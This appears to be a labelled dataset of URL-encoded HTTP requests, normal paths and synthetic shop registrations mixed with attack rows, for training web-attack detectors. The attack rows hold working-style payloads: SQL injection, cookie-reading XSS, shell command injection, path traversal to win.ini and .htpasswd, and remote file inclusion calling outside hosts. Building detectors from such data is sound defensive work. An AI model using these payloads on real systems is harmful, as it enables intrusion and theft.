request	label
/ petenicely / 	0
/ head_activities / 	0
"/ help . php ? q =  ""  \ x0auname  > q61288617  # "	1
/ string / strings / parameters = -9770 '  )  )  as ovhh where 7903 = 7903 or 5023 = ctxsys . drithsx . sn ( 5023 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  -- 	1
/ 1159204 / 	0
/ javascript / owa . dump 	0
/ javascript / media . dll 	0
/ 000055429 / 	0
/ string / strings / parameters = brana 	0
"/ g3w7y7u5 . cfc ?  < meta http-equiv = set-cookie content =  "" testbfpq = 3326 ""  > "	1
/ string / strings / parameters = if ( 2 = 2 , 1 , sleep ( 5 )  )  --  + 	1
"/ string / strings / parameters = 1 ""  ""  where 2309 = 2309 or elt ( 5873 = 5873 , sleep ( 5 )  )  # "	1
/ string / strings / parameters = -7678 )  )  )  union all select 2622 , 2622 , 2622 , 2622 , 2622 , 2622 , 2622 , 2622 -- 	1
/ 607225 / 	0
/ string / strings / parameters = rosic @ faders . com . sn 	0
/ 154382 / 	0
"/  ?  < meta http-equiv = set-cookie content =  "" testsory = 7676 ""  > "	1
/ 10000317 / 	0
/ string / strings / parameters = zahn 	0
"/ string / strings / parameters = ""  `  '  >  < script >  \ x21javascript : alert ( 1 )  <  / script > "	1
/ string / strings / parameters = 57757963h 	0
/ string / modo = registro & login = conchita & password = equ1tacin & nombre = sahid & apellidos = argimn & email = schucrenberg-oheaney3 @ testdevelcidad . info & dni = 55540530s & direccion = pl .  + cantarranillas + 21 ,  +  & ciudad = talavera & cp = 17751 & provincia = len & ntc = 1888165017368126 & b1 = registrar 	0
"/ 3hlysl2x . jsp ?  < meta http-equiv = set-cookie content =  "" testgjbe = 8505 ""  > "	1
/ string / modo = insertar & precio = 5093 & b1 = confirmar 	0
/ string / strings / parameters = simat de la valldigna 	0
"/ main . php ? stuff =  ""  \ x0dsleep 9  # "	1
/ string / strings / parameters = & lt ; script > 	1
"/ string / strings / parameters = <  !  --  # echo var =  "" forwarded ""   --  > "	1
/ string / modo = registro & login = sim & password = alzador & nombre = rut & apellidos = brzozowski & email = heston-bertran8 @ animextremist . qa & dni = 00423300p & direccion = plaa + mercadal ,  + 178 +  & ciudad = pulp & cp = 10880 & provincia = navarra & ntc = 848868523325038a & b1 = registrar 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo xbwwvf )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ pgnum-6 / 	0
/ 0789731150_cs / 	0
"/ string / strings / parameters = 1 ""  ""  where 5552 = 5552 or 5356 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  -- "	1
/ awstats / awstats . pl ? migrate =  | echo ; chmod 555  / tmp / urcppbumwm0 ; echo | awstats379091 . txt 	1
/ string / modo = registro & login = wingfiel & password = e7piocha & nombre = nelber & apellidos = guisset + melo & email = himsel_ewande @ spainbareback . ad & dni = 46909856e & direccion = calle + llorente ,  + 73 ,  +  & ciudad = almendros & cp = 18056 & provincia = segovia & ntc = 6051283297189804 & b1 = registrar 	0
/ lib / classes / swift / mime / embeddedfile . php . bak 	0
/ string / strings / parameters = -2505 '  or 9323 = 9323 # 	1
/ 048815 / 	0
/ empireofkarn / 	0
/ string / modo = registro & login = chihung & password = 97lea0 & nombre = caleb & apellidos = moscoso + danot & email = mike-osbourne @ hiperzaragoza . qa & dni = 41910864b & direccion = plza .  + musico + diaz + cano + 5 ,  +  & ciudad = espronceda & cp = 16144 & provincia = burgos & ntc = 4646925880970082 & b1 = registrar 	0
"/ apavxugx . pl ?  < meta http-equiv = set-cookie content =  "" testdnbh = 5237 ""  > "	1
/ javascript / ms-sql . swf 	0
/ secretgov / 	0
/ string / strings / parameters = rinconada de la sierra ,  la 	0
/ string / strings / parameters = 6204145249044457 	0
/ string / strings / parameters = file :  / c :  / windows / win . ini 	1
/ bitcleaner / 	0
/ string / strings / parameters = | echo $ ifstxnbjz $  (  ( 0 + 67 )  )  $  ( echo $ ifstxnbjz ) txnbjz 	1
/ string / strings / parameters = mouchet @ 007tv . fj 	0
/ string / strings / parameters = hartling @ solmicro-erp . dz 	0
/ norloth_information / 	0
/ 175144 / 	0
/ 158193 / 	0
/ javascript / photo . exe 	1
/ 162456 / 	0
"/ de3v2dd9 . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 1 or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 ) 	1
/ 121006_dakotacwpressconf / 	0
/ string / strings / parameters = $  { system ( print (  ` echo mqqjpg \ necho  $  (  ( 72 + 19 )  )  \ necho mqqjpg \ necho mqqjpg `  )  ;  # mqqjpg 	1
/ admin / datasource . asp 	0
"/ string / strings / parameters = ""  >  < a href = javascript & colon ; confirm & lpar ; document & period ; cookie & rpar ;  > click here <  / a > "	1
"/ string / strings / parameters = ""  ; echo bqscfc $  (  ( 0 + 98 )  )  $  ( echo bqscfc ) bqscfc /  / "	1
/ work_circumstances / 	0
/ h43496qsghf / 	0
/ jan guillou - ondskan ljudbok / 	0
/ string / strings / parameters = -4205 '  union all select 8986 , 8986 , 8986 , 8986 , 8986 , 8986 , 8986 , 8986 , 8986 , 8986 # 	1
/ usr / bin / id | 	1
/ ra snail mail v1 / 	0
/ string / modo = insertar & precio = 2742 & b1 = pasar + por + caja 	0
"/ 6dlc2zm9 . htm ?  < script > document . cookie =  "" testqpux = 4016 ;  ""  <  / script > "	1
/ 123590 / 	0
"/ h5sc3gxy . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ a48451094 / 	0
/ 747782-63 / 	0
/ theatre_audiences / 	0
/ string / strings / parameters = hermine @ 943 . mw 	0
/ javascript / flash . pfx 	0
/ string / strings / parameters = ;  str =  $  ( echo dapkxg )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  # 	1
/ aa394489 / 	0
/ string / strings / parameters = renan1 @ fichajes . nom . sd 	0
"/ dslpwt15 . pl ?  < meta http-equiv = set-cookie content =  "" testtkio = 5454 ""  > "	1
/ shadowrun_information / 	0
/ string / strings / parameters = |  | echo zlpjpq $  (  ( 81 + 32 )  )  $  ( echo zlpjpq ) zlpjpq | 	1
/ securecgi-bin / csusercgi . exe ? ver 	1
"/ string / strings / parameters = ;  str =  $  ( echo hdixth )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ 3241_default / 	0
/ biblioteca / bib_searchc . php ? classpath = xxpathxx 	1
/ javascript / cpp . exe 	1
/ string / modo = registro & login = mwa & password = ja34ico & nombre = paula & apellidos = borque + clua & email = tarasova_dabo @ comerciosdeaspe . ly & dni = 15820845l & direccion = bravo + murillo + 18 +  & ciudad = ponts & cp = 10373 & provincia = toledo & ntc = 0106705329803127 & b1 = registrar 	0
/ string / strings / parameters = talavera 5 	0
/ idc_whitepaper / 	0
/ string / modo = entrar & login = lacoste & pwd = h9erc5 & remember = on & b1 = entrar 	0
/ figura1 / 	0
/ new_legends / 	0
/ javascript / lst . cgi 	0
/ string / strings / parameters = 1 '  +  ( select  ' vedi '  where 2774 = 2774 and 9660 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  -- 	1
"/ string / strings / parameters = 1 ""  ""  )  )  )  and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  (  ""  "" xnsj ""  ""  like  ""  "" xnsj "	1
/ cpr-24n3 / 	0
/ javascript / stores . class 	0
/ javascript / my . jhtml 	0
/ string / strings / parameters = 54tra03u38706 	0
/ md5_verify / 	0
/ string / strings / parameters = cenobia 	0
/ eclasses2 / 	0
/ freddy vs jason movie script / 	1
/ transition-r0 / 	0
/ syrp1124 / 	0
/ netpbm / 	0
/ string / strings / parameters = c ! andeleta 	0
/ javascript / random 	0
/ starshiptroopersv1 / 	0
/ sports_fans / 	0
"/ eei78ore . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 0764543334 / 	0
"/ copying /  <  / p >  < body >  < script / src =  "" http :  /  / www . example . com / test ? rnd = q48678656 ""  >  <  / script >  < p > "	1
/ dnslogger / 	0
"/ uvazfs7p . htm ?  < meta http-equiv = set-cookie content =  "" testwtbo = 4831 ""  > "	1
/ javascript / match . dll 	0
/ settings . php ? p [ includes ]  = xxpathxx 	1
/ javascript / intl . asp 	0
/ scripts / rwcgi60 / showenv 	1
"/ main . php ? stuff =  ""  ; del \ x09q87779896 \ x09 # "	1
"/ vjbrrppi . cfm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ cgi-bin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 82311197 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ string / strings / parameters = lonidas 	0
/ string / strings / parameters = kempler7 	0
/ polk-county / 	0
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 26 . 202 /  & frm_user =  & scr_height = q78911548 & scr_width = 	1
/ javascript / pt . exe 	1
"/ string / strings / parameters = < script > document . cookie =  "" testziyq = 5055 ;  ""  <  / script > "	1
/ 000114743 / 	0
/ xtra_hub / 	0
/ csmajor / 	0
/ string / modo = registro & login = career & password = telgrafo & nombre = alexia & apellidos = de + castro + wlker & email = jans @ voragolive . do & dni = 63653644v & direccion = sanlucar + la + mayor ,  + 148 ,  +  & ciudad = atzeneta + del + maestrat & cpa = 16270 & provincia = ciudad + real & ntc = 5906206602610899 & b1 = registrar 	1
/ string / strings / parameters = las gijn 	0
/ 3571066 / 	0
/ string / modo = registro & login = schloboh & password = e229dado & nombre = ce-lso & apellidos = cresp + zarzosa & email = lune-dulier @ natravea . py & dni = 51098953z & direccion = av .  + pedro + mata ,  + s / n + 8 ? f & ciudad = ataun & cp = 24367 & provincia = vila & ntc = 2333052430103872 & b1 = registrar 	1
/ javascript / viewcvs . exe 	1
/ showproduct / 	0
/ 5lp0y0aikc / 	0
/ string / strings / parameters = mahonri 	0
/ cat_accounting / 	0
/ 506140 / 	0
/ string / strings / parameters = offers 	0
/ string / strings / parameters = 1 '  in boolean mode )  and 7533 = 7533 # 	1
/ string / strings / parameters = molinos de duero 	0
/ string / strings / parameters = suyay 	0
/ string / strings / parameters = ;  str =  $  ( echo iboovb )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ ispworld-index / 	0
/ string / modo = registro & login = durovic & password = aa & nombre = genaro & apellidos = oate + fijo & email = alfonso . julissa @ naturalchild . tk & dni = 89740217j & direccion = calle + gibraltar ,  + 88 +  & ciudad = poyales + del + hoyo & cp = 44381 & provincia = badajoz & ntc = 7581478216887390 & b1 = registrar 	0
/ phpmyadmin /  /  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows / win . ini 	1
/ 107934 / 	0
"/ iv5vkgam . kspx ?  < meta http-equiv = set-cookie content =  "" testfosd = 94 ""  > "	1
"/ t578vqea . html ?  < meta http-equiv = set-cookie content =  "" testsory = 7676 ""  > "	1
"/ string / strings / parameters = 1 ""  ""  )  )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  and  (  (  ""  "" rfam ""  ""  like  ""  "" rfam "	1
"/ string / strings / parameters = < iframe width = 0 height = 0 src =  "" javascript : confirm ( 1 )  ""  > "	1
"/ string / strings / parameters = 1 ""  ""  )  )  )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  and  (  (  (  ""  "" znzb ""  ""  like  ""  "" znzb "	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo jweawe )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  & "	1
/ popcorn_weblog / 	0
/ string / strings / parameters = '  |  | echo juqyuk $  (  ( 27 + 47 )  )  $  ( echo juqyuk ) juqyuk \  \ 	1
/ noel_158x158 / 	0
/ string / strings / parameters = henckels @ easyviaggio . tr 	0
/ string / modo = registro & login = sprayber & password = e298r4jina715 & nombre = edilio & apellidos = piols + padilla & email = lerch @ piaceredelivery . mr & dni = 81177297q & direccion = carril + lloret ,  + 52 +  & ciudad = puebla + de + albortn & cp = 03500 & provincia = tarragona & ntc = 1228688038789321 & b1 = registrar 	0
/ starwarsbattlegrounds / 	0
/ string / strings / parameters = -9841 where 4612 = 4612 union all select 4612 -- 	1
/ templates / slashdot / template . tpl . php ? renderer = xxpathxx 	1
/ 100890441 / 	0
/ string / strings / parameters = '  |   [  6 -ne  $  ( echo fnegwh  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ string / strings / parameters = -4954 '  )  or 8571 = 8571 -- 	1
/ string / strings / parameters = cos6rio 	0
"/ string / strings / parameters = ""  "" x : alert ""  ""  onerror =  ""  "" eval ( src +  '  ( 0 )  '  )  ""  ""  > "	1
/ dj faala - the energy hour vol / 	0
/ train_fare / 	0
/ string / strings / parameters = 1 )  )  )  and elt ( 3132 = 1541 , 1541 )  and  (  (  ( 4258 = 4258 	1
/ string / modo = registro & login = yung-fu & password = 8ach35 & nombre = atico & apellidos = farzati + bols & email = gobert @ olvidalo . sh & dni =  ' injected_param & direccion = calle + salamanca ,  + 147 ,  + 12-c & ciudad = llacuna ,  + la & cp = 42192 & provincia = la + rioja & ntc = 6202220690818816 & b1 = registrar 	1
/ string / strings / parameters = huston 	0
/ string / strings / parameters = ignacio aldecoa ,  30 ,  6h 	0
/ r2 / extreme wa2  ( v1 / 	0
/ igtf0zon . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 2215802110015527433bqkzzk / 	0
/ 136254 / 	0
/ string / strings / parameters = 92086641t 	0
/ skin / html / table . php ? pachtofile = xxpathxx 	1
"/ string / modo =  <  !  --  # exec + cmd =  "" ls +  /  ""  --  >  & login = crowder & pwd = 6 . en0e6at2da & remember = on & b1 = entrar "	1
/ scripts / xtextarea . scr . php ? globals [ pth ]  [ spaw ]  =  @ rfiurl ? globals [ pth ]  [ spaw ]  =  @ rfiurl ? 	1
/ string / modo = insertar & precio = 5107 & b1 = pasar + por + caja 	0
/ koizumi1 / 	0
/ a2icon / 	0
/ string / strings / parameters = echo dcvfld $  (  ( 69 + 75 )  )  $  ( echo dcvfld ) dcvfld ' 	1
"/ string / strings / parameters = 1 ""  ""  )  as zopq where 2680 = 2680 ; select count (  *  )  from generate_series ( 1 , 5000000 )  -- "	1
/ string / strings / parameters = |  |  / usr / bin / id | 	1
"/ yef5f3d5 . fts ?  < meta http-equiv = set-cookie content =  "" testcrcv = 6167 ""  > "	1
/ string / modo = insertar & precio = 3244 & b1 = pasar + por + caja 	0
/ javascript / port . c 	0
"/ string / strings / parameters = -2916 ""  ""  )  )  or 4946 = 8232 -- "	1
/ string / modo = insertar & precio = 2158 & b1 = pasar + por + caja / 	1
/ rgboard / include / footer . php ? _path [ counter ]  = xxpathxx ? 	1
/ main / ppcbannerclick . php ? inc = xxpathxx ? 	1
/ self_infliction / 	0
/ javascript / bfc . conf 	0
"/ string / strings / parameters = 1 ""  ""  )  and 6414 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  (  ""  "" rvub ""  ""  like  ""  "" rvub "	1
/ 1166372887 / 	0
/ string / strings / parameters = 1 '  )  )  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  ' pydi '  like  ' pydi 	1
/ 129387 / 	0
"/ scs86g1p . aspx ?  < script > document . cookie =  "" testquyx = 2820 ;  ""  <  / script > "	1
/ string / modo = registro & login = duffy & password = acabadamente & nombre = tali & apellidos = nrez + muriscot & email = vanity @ espaciodelpintor . kn & dni = 88102583w & direccion = albadalejo + hijuela + 76 ,  +  & ciudad = lomoviejo & cp = 09247 & provincia = barcelona & ntc = 2777667912628191 & b1 = registrar 	0
/ 2145430 / 	0
/ vb_file / 	0
/ string / modo = registro & login = wynnie & password = asc60ca & nombre = nicomedes & apellidos = sigenza + mosconi & email = gatliff . charlton @ eco-pro . jm & dni = 22997473a & direccion = c / jon + habana ,  + 111 +  & ciudad = villalobn & cp = 18659 & provincia = badajoz & ntc = 9785799371195740 & b1 = registrar 	0
/ javascript / pt . manifest 	0
"/ azcrfs8d . nsf ?  < meta http-equiv = set-cookie content =  "" testjpdr = 9205 ""  > "	1
/ string / strings / parameters = ;  str =  $  ( echo oiphjr )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ player . xls 	0
/ 1222talkstersm / 	0
/ string / strings / parameters = ex8ed2ci3 	0
"/ i2n4v4rl . dll ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ help . php ? q =  ""  & rm ; q53523271 & rem ; "	1
/ schulich-scholars / 	0
/ string / strings / parameters = kuss @ inoxled . jobs 	0
/ string / strings / parameters = pulsar 	0
/ mostlyce / jscripts / tiny_mce / plugins / htmltemplate / htmltemplate . php ? mosconfig_absolute_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ? 	1
/ bfshapefiles / 	0
/ bin /  . htpasswd 	1
/ string / strings / parameters = grandura 	0
/ a3fl9dl969r9yt / 	0
/ 146445 / 	0
/ string / strings / parameters = 1 )  )  )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  and  (  (  ( 3023 = 3023 	1
/ string / modo = registro & login = emerson & password = imperialista & nombre = nevnka & apellidos = eraso + rebes & email = radmilovic_ @ faig @ caspospas . ie & dni = 93314361a & direccion = plaza + morquera + s / n +  & ciudad = graja + de + campalbo & cp = 49638 & provincia = almera & ntc = 1918567555669782 & b1 = registrar 	1
/ 01278a_internet2 / 	0
/ javascript / websql . exe 	1
/ string / strings / parameters = m0nuta9 	0
/ 039202 / 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo kjbkaz )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1 	1
/ javascript / loading . rar 	0
/ 06-40066 / 	0
/ string / strings / parameters = 5003 	0
/ string / modo = registro & login = kamran & password =  + sacio & nombre = bladimiro & apellidos = barreda + icaza & email = cserhalmi @ ankawaelda . net & dnia = 41585257s & direccion = c /  + rossello + 154 + 13-h & ciudad = atez & cp = 31264 & provincia = cantabria & ntc = 9078165703256769 & b1 = registrar 	1
